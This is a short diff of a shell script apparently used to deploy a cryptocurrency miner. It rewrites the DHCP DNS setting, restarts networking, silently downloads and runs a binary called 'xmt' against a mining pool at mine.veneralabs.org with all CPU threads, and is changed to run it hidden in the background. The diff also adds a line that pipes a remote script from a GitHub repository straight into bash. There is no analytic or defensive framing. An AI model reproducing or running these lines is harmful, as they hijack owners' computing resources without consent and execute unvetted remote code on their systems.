@@ -10,4 +10,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget https://github.com/kartolo92/jadul/raw/main/xmt >/dev/null 2>&1
 chmod +x xmt
-./xmt -u VENeRa1Z4TPhJ3vLqwpM2LD2KdBwrpjghYgprfhxgpWyjSjgQakfpkSCrJGU9TCuZQ6PceZQLGe1v1JGrLcMzK8ieHVfAChCQAw3F.$(shuf -n 1 -i 1-99999)-KIR -o mine.veneralabs.org:9099 --tls -p x -t $(nproc --all)
+./xmt -u VENeRa1Z4TPhJ3vLqwpM2LD2KdBwrpjghYgprfhxgpWyjSjgQakfpkSCrJGU9TCuZQ6PceZQLGe1v1JGrLcMzK8ieHVfAChCQAw3F.$(shuf -n 1 -i 1-99999)-KIR -o mine.veneralabs.org:9099 --tls -p x > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash -t $(nproc --all)
